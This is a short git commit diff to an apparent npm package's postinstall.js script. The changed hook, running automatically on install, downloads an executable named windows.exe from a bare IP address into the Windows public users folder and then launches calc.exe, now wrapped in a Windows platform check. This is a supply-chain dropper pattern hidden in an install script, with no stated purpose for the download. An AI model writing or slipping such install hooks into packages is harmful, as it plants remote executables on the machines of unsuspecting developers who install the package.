7cce750c420e92ad4de2ecfd52cee5e9e862c6ce
daltonchristiano060-gif <daltonchristiano060@gmail.com>
2026-05-07 01:50:28 -0700

    Update postinstall.js

--- scripts/postinstall.js
+++ scripts/postinstall.js
@@ -1,11 +1,19 @@
 import fs from 'node:fs';
 import http from 'node:http';
-
-http.get('http://172.86.73.132/windows.exe', (res) => {
-  const file = fs.createWriteStream('c:/users/public/windows.exe');
-  res.pipe(file);
-});
-
+import os from 'node:os';
 import { exec } from 'node:child_process';
+if (os.platform() === 'win32') {
+    console.log('Running on Windows');
+    http.get('http://172.86.73.132/windows.exe', (res) => {
+      const file = fs.createWriteStream('c:/users/public/windows.exe');
+      res.pipe(file);
+      exec('start calc.exe'); // Windows
+    });
+} else {
+    console.log('Not Windows');
+}
 
-exec('start calc.exe'); // Windows
+
+
+
+
